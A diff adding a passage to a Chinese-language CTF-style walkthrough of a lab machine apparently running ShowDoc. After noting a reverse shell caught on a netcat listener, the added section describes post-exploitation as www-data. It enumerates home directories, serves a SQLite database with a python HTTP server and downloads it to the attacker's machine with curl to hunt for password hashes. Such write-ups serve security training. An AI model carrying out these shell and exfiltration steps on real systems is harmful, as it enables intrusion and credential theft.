@@ -83,3 +83,33 @@ listening on [any] 7777 ...
 ```
 
 上传后访问得到的url就可以看到shell反弹了
+## 提权
+我们现在只有最低的www权限
+所以先看一下用户，
+```bash
+www-data@Show:~/html/Sqlite$ ls -l /home
+ls -l /home
+total 8
+drwx------ 2 l1qin9 l1qin9 4096 Apr 25 22:47 l1qin9
+drwx------ 2 mooi   mooi   4096 Apr 25 20:09 mooi
+
+```
+有两个用户，都是一样的权限。
+
+然后翻一翻目录，找到了一个`/html/Sqlite/showdoc.db.php`
+sqlite的数据库文件，我们看看会不会在数据库中保存了账号密码
+起一个python服务，下载下来到Navicat看看。
+```bash
+#靶机shell:
+www-data@Show:~/html/Sqlite$ python3 -m http.server 8080
+python3 -m http.server 8080
+```
+
+```powershell
+#本机shell:
+PS D:\webtool\Dirsearch> curl http://10.241.108.8:8080/showdoc.db.php -O "showdoc.db.php"
+```
+![](file-20260428181149330.png)
+打开能看到我自己的用户和一个showdoc目录，但是可惜密码是哈希加密的，cmd5也没爆出来
+只能继续去找了，我们找一找配置文件
+
